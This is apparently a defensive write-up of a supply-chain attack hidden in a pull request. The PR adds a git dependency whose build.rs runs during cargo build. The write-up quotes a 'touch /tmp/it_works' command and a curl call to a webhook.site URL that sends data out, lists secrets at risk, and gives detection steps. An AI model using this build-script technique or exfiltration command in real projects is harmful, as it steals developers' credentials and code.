# Supply Chain Attack Flow - PR #12

## How the Attack Works

```
┌─────────────────────────────────────────────────────────────────┐
│ Step 1: Malicious PR Created                                   │
│ ───────────────────────────────────────────────────────────────│
│ • PR #12 opened by slin99                                       │
│ • Claims to fix a build issue                                   │
│ • Adds dependency: tmpfix                                       │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ Step 2: Developer Reviews & Merges (HYPOTHETICAL)              │
│ ───────────────────────────────────────────────────────────────│
│ • Developer sees "fixes build"                                  │
│ • Looks like a simple dependency addition                       │
│ • Merges without deep review                                    │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ Step 3: Another Developer Pulls & Builds                       │
│ ───────────────────────────────────────────────────────────────│
│ • Developer runs: git pull                                      │
│ • Developer runs: cargo build                                   │
│ • Cargo fetches dependencies...                                 │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ Step 4: Cargo Fetches Malicious Dependency                     │
│ ───────────────────────────────────────────────────────────────│
│ • Cargo clones: https://github.com/slin99/tmpfix               │
│ • Package name mismatch detected (tmpfix vs google-drive3)      │
│ • BUT: build.rs already downloaded...                           │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ Step 5: build.rs Executes (ATTACK STARTS)                      │
│ ───────────────────────────────────────────────────────────────│
│ • Cargo runs build.rs BEFORE compilation                        │
│ • Malicious code executes with user's permissions               │
│ • No user interaction required                                  │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ Step 6: Malicious Actions Executed                             │
│ ───────────────────────────────────────────────────────────────│
│ Action 1: File System Access                                    │
│   • Command: sh -c "touch /tmp/it_works"                        │
│   • Creates file: /tmp/it_works                                 │
│   • Proves code execution capability                            │
│                                                                  │
│ Action 2: Network Communication                                 │
│   • Command: curl https://webhook.site/[redacted]              │
│   • Sends data to external server                               │
│   • Could exfiltrate environment variables, source code, etc.   │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│ Step 7: Build Fails (But Damage Done)                          │
│ ───────────────────────────────────────────────────────────────│
│ Error: no matching package named `tmpfix` found                 │
│                                                                  │
│ Developer thinks: "Must be a bad dependency"                    │
│ Meanwhile:                                                       │
│   • File /tmp/it_works exists                                   │
│   • Data sent to attacker's webhook                             │
│   • System potentially compromised                              │
└─────────────────────────────────────────────────────────────────┘
```

## Why This Attack is Dangerous

### 1. Executes Before Compilation
- `build.rs` runs during the dependency resolution phase
- No need to actually run the compiled binary
- Just running `cargo build` is enough

### 2. User Permissions
- Executes with the same permissions as the user
- Can read source code, environment variables, secrets
- Can modify files, install backdoors, etc.

### 3. Looks Innocent
- PR title claims to fix a build issue
- Adding a dependency seems normal
- Developers might not review external repos

### 4. Fails Gracefully
- Build fails due to package name mismatch
- Developers might think it's just a typo
- Don't realize malicious code already executed

## What Could Be Stolen

```
Environment Variables:
├── API Keys (AWS_ACCESS_KEY_ID, etc.)
├── Database Credentials (DB_PASSWORD, etc.)
├── OAuth Tokens (GITHUB_TOKEN, etc.)
└── Service Credentials

Source Code:
├── Proprietary algorithms
├── Business logic
├── Configuration files
└── Other secrets in code

System Information:
├── Username
├── Hostname
├── Network configuration
└── Running processes
```

## How to Detect

### Check for the file:
```bash
ls -la /tmp/it_works
```

### Check network logs:
```bash
# Look for connections to webhook.site
grep -r "webhook.site" /var/log/
```

### Check cargo cache:
```bash
ls -la ~/.cargo/git/checkouts/ | grep tmpfix
```

## How This Was Prevented

✅ **This attack was caught during PR review**
- Reviewed PR #12 before merge
- Investigated the dependency
- Found malicious build.rs
- Documented the threat
- **PR #12 should NOT be merged**

## Lessons Learned

1. **Always review dependency additions**
   - Check the repository
   - Review build.rs files
   - Verify package names match

2. **Use branch protection**
   - Require reviews
   - Run security checks
   - Don't allow direct pushes to main

3. **Prefer crates.io over git dependencies**
   - Crates.io has security scanning
   - Git repos are harder to audit
   - Version pinning is clearer

4. **Test in isolated environments**
   - Use containers or VMs
   - Don't build untrusted code on your machine
   - Monitor network and file system activity

---

**Remember:** Supply chain attacks are real and increasingly common. Stay vigilant!
